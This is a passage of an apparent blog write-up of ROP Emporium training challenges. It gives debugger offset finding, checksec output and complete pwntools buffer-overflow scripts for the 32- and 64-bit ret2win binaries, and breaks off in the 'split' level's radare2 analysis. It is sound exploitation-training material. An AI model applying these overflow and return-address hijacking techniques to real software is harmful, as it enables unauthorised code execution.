‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
gef‚û§  pattern offset 0x6161616c 50
<span class="o">[</span>+] Searching <span class="s1">'0x6161616c'</span>
<span class="o">[</span>+] Found at offset 44 <span class="o">(</span>little-endian search<span class="o">)</span> likely
<span class="o">[</span>+] Found at offset 41 <span class="o">(</span>big-endian search<span class="o">)</span>
gef‚û§
</code></pre></div></div>

<p>Quick exploit script written in python.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="mi">1</span> <span class="c1">#!/usr/bin/env python
</span>  <span class="mi">2</span>
  <span class="mi">3</span> <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
  <span class="mi">4</span>
  <span class="mi">5</span> <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'critical'</span>
  <span class="mi">6</span>
  <span class="mi">7</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./ret2win"</span><span class="p">)</span>
  <span class="mi">8</span>
  <span class="mi">9</span> <span class="n">ret2win_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'ret2win'</span><span class="p">]</span>
 <span class="mi">10</span>
 <span class="mi">11</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">44</span>
 <span class="mi">12</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret2win_addr</span><span class="p">)</span>
 <span class="mi">13</span>
 <span class="mi">14</span> <span class="n">sh</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
 <span class="mi">15</span>
 <span class="mi">16</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">)</span>
 <span class="mi">17</span> <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="mi">18</span>
 <span class="mi">19</span> <span class="k">print</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
</code></pre></div></div>

<p>And then, the flag.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/Documents/ropemporium/ret2win/32ret2win# <span class="nb">chmod</span> +x exploit.py <span class="o">&amp;&amp;</span> ./exploit.py
Thank you! Here<span class="s1">'s your flag:ROPE{a_placeholder_32byte_flag!}
</span></code></pre></div></div>

<h3 id="64-bit">64-bit</h3>

<p>Running checksec.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/ropemporium/ret2win/64ret2win# checksec ./ret2win
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/root/Documents/ropemporium/ret2win/64ret2win/ret2win'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
</code></pre></div></div>

<p>Since this is 64 bit, we will notice something different with the gdb output once we overflow the buffer.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef‚û§  pattern create 50
<span class="o">[</span>+] Generating a pattern of 50 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
<span class="o">[</span>+] Saved as <span class="s1">'$_gef0'</span>
gef‚û§  run
Starting program: /root/Documents/ropemporium/ret2win/64ret2win/ret2win
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer<span class="p">;</span>
What could possibly go wrong?
You there madam, may I have your input please? And don<span class="s1">'t worry about null bytes, we'</span>re using fgets!

<span class="o">&gt;</span> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400810 <span class="k">in </span>pwnme <span class="o">()</span>
<span class="o">[</span> Legend: Modified register | Code | Heap | Stack | String <span class="o">]</span>
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ registers ‚îÄ‚îÄ‚îÄ‚îÄ
<span class="nv">$rax</span>   : 0x00007fffffffe0f0  ‚Üí  <span class="s2">"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaag"</span>
<span class="nv">$rbx</span>   : 0x0               
<span class="nv">$rcx</span>   : 0xfbad2288        
<span class="nv">$rdx</span>   : 0x00007fffffffe0f0  ‚Üí  <span class="s2">"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaag"</span>
<span class="nv">$rsp</span>   : 0x00007fffffffe118  ‚Üí  <span class="s2">"faaaaaaag"</span>
<span class="nv">$rbp</span>   : 0x6161616161616165 <span class="o">(</span><span class="s2">"eaaaaaaa"</span>?<span class="o">)</span>
<span class="nv">$rsi</span>   : 0x00007ffff7fac8d0  ‚Üí  0x0000000000000000
<span class="nv">$rdi</span>   : 0x00007fffffffe0f1  ‚Üí  <span class="s2">"aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaag"</span>
<span class="nv">$rip</span>   : 0x0000000000400810  ‚Üí  &lt;pwnme+91&gt; ret
<span class="nv">$r8</span>    : 0x0               
<span class="nv">$r9</span>    : 0x00007ffff7fb1500  ‚Üí  0x00007ffff7fb1500  ‚Üí  <span class="o">[</span>loop detected]
<span class="nv">$r10</span>   : 0x0000000000602010  ‚Üí  0x0000000000000000
<span class="nv">$r11</span>   : 0x246             
<span class="nv">$r12</span>   : 0x0000000000400650  ‚Üí  &lt;_start+0&gt; xor ebp, ebp
<span class="nv">$r13</span>   : 0x00007fffffffe200  ‚Üí  0x0000000000000001
<span class="nv">$r14</span>   : 0x0               
<span class="nv">$r15</span>   : 0x0               
<span class="nv">$eflags</span>: <span class="o">[</span>ZERO carry PARITY adjust sign <span class="nb">trap </span>INTERRUPT direction overflow RESUME virtualx86 identification]
<span class="nv">$cs</span>: 0x0033 <span class="nv">$ss</span>: 0x002b <span class="nv">$ds</span>: 0x0000 <span class="nv">$es</span>: 0x0000 <span class="nv">$fs</span>: 0x0000 <span class="nv">$gs</span>: 0x0000
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ stack ‚îÄ‚îÄ‚îÄ‚îÄ
0x00007fffffffe118‚îÇ+0x0000: <span class="s2">"faaaaaaag"</span>  ‚Üê <span class="nv">$rsp</span>
0x00007fffffffe120‚îÇ+0x0008: 0x0000000000400067  ‚Üí   add al, bh
0x00007fffffffe128‚îÇ+0x0010: 0x00007ffff7e1309b  ‚Üí  &lt;__libc_start_main+235&gt; mov edi, eax
0x00007fffffffe130‚îÇ+0x0018: 0x0000000000000000
0x00007fffffffe138‚îÇ+0x0020: 0x00007fffffffe208  ‚Üí  0x00007fffffffe4e4  ‚Üí  <span class="s2">"/root/Documents/ropemporium/ret2win/64ret2win/ret2[...]"</span>
0x00007fffffffe140‚îÇ+0x0028: 0x0000000100000000
0x00007fffffffe148‚îÇ+0x0030: 0x0000000000400746  ‚Üí  &lt;main+0&gt; push rbp
0x00007fffffffe150‚îÇ+0x0038: 0x0000000000000000
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ code:x86:64 ‚îÄ‚îÄ‚îÄ‚îÄ
     0x400809 &lt;pwnme+84&gt;       call   0x400620 &lt;fgets@plt&gt;
     0x40080e &lt;pwnme+89&gt;       nop    
     0x40080f &lt;pwnme+90&gt;       leave  
 ‚Üí   0x400810 &lt;pwnme+91&gt;       ret    
<span class="o">[!]</span> Cannot disassemble from <span class="nv">$PC</span>
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ threads ‚îÄ‚îÄ‚îÄ‚îÄ
<span class="o">[</span><span class="c">#0] Id 1, Name: "ret2win", stopped, reason: SIGSEGV</span>
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ trace ‚îÄ‚îÄ‚îÄ‚îÄ
<span class="o">[</span><span class="c">#0] 0x400810 ‚Üí pwnme()</span>
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
gef‚û§  pattern offset 0x6161616161616165 50
<span class="o">[</span>+] Searching <span class="s1">'0x6161616161616165'</span>
<span class="o">[</span>+] Found at offset 32 <span class="o">(</span>little-endian search<span class="o">)</span> likely
<span class="o">[</span>+] Found at offset 25 <span class="o">(</span>big-endian search<span class="o">)</span>
gef‚û§
</code></pre></div></div>

<p>We see that we don‚Äôt overwrite RIP at all. This is because we overwrote RIP with an invalid address greater than <code class="highlighter-rouge">0x00007fffffffffff</code>, which is the maximum address size of a 64 bit system. This causes the OS to raise an exception and thus not update RIP‚Äôs value at all.</p>

<p>However, we did overwrite RBP, and we know that the return address exists 8 bytes past RBP‚Äôs address. Finding the offset for RBP (32) then adding 8 to it, gives us the offset for overwriting RIP, which is 32+8=40.</p>

<p>Note that we still have control of RIP, it‚Äôs just that we can‚Äôt write an invalid address to it. Fortunately, the address to the <code class="highlighter-rouge">ret2win()</code> function <em>is</em> a valid address, so the following script does the job.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="mi">1</span> <span class="c1">#!/usr/bin/env python
</span>  <span class="mi">2</span>
  <span class="mi">3</span> <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
  <span class="mi">4</span>
  <span class="mi">5</span> <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'critical'</span>
  <span class="mi">6</span>
  <span class="mi">7</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./ret2win"</span><span class="p">)</span>
  <span class="mi">8</span>
  <span class="mi">9</span> <span class="n">ret2win_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'ret2win'</span><span class="p">]</span>
 <span class="mi">10</span>
 <span class="mi">11</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">40</span>
 <span class="mi">12</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret2win_addr</span><span class="p">)</span>
 <span class="mi">13</span>
 <span class="mi">14</span> <span class="n">sh</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
 <span class="mi">15</span>
 <span class="mi">16</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">)</span>
 <span class="mi">17</span> <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="mi">18</span>
 <span class="mi">19</span> <span class="k">print</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
</code></pre></div></div>

<p>Easy.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/Documents/ropemporium/ret2win/64ret2win# ./exploit.py
Thank you! Here<span class="s1">'s your flag:ROPE{a_placeholder_32byte_flag!}
</span></code></pre></div></div>

<h1 id="split">split</h1>

<p>This level takes it up a notch, and has us set up the stack such that we call <code class="highlighter-rouge">system()</code> ourselves and supply our own argument of ‚Äò/bin/cat flag.txt‚Äô.</p>

<h3 id="32-bit-1">32-bit</h3>

<p>Running checksec.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/ropemporium/split/32split# checksec ./split32
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/root/Documents/ropemporium/split/32split/split32'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>

</code></pre></div></div>

<p>Let‚Äôs pop it through radare2 and see what we can see.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/ropemporium/split/32split# r2 ./split32
<span class="o">[</span>0x08048480]&gt; aaaa
<span class="o">[</span>x] Analyze all flags starting with sym. and entry0 <span class="o">(</span>aa<span class="o">)</span>
<span class="o">[</span>x] Analyze <span class="k">function </span>calls <span class="o">(</span>aac<span class="o">)</span>
<span class="o">[</span>x] Analyze len bytes of instructions <span class="k">for </span>references <span class="o">(</span>aar<span class="o">)</span>
<span class="o">[</span>x] Constructing a <span class="k">function </span>name <span class="k">for </span>fcn.<span class="k">*</span> and sym.func.<span class="k">*</span> functions <span class="o">(</span>aan<span class="o">)</span>
<span class="o">[</span>x] Enable constraint types analysis <span class="k">for </span>variables
<span class="o">[</span>0x08048480]&gt; afl
...
0x0804857b    1 123          sym.main
0x080485f6    1 83           sym.pwnme
0x08048649    1 25           sym.usefulFunction
...
<span class="o">[</span>0x08048480]&gt;
</code></pre></div></div>

<p>Looking at the important bit, we see three functions now. We can assume <code class="highlighter-rouge">main()</code> calls <code class="highlighter-rouge">pwnme()</code> as that‚Äôs the theme the challenges take. Let‚Äôs check <code class="highlighter-rouge">pwnme()</code>.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>0x08048480]&gt; s sym.pwnme
<span class="o">[</span>0x080485f6]&gt; pdf
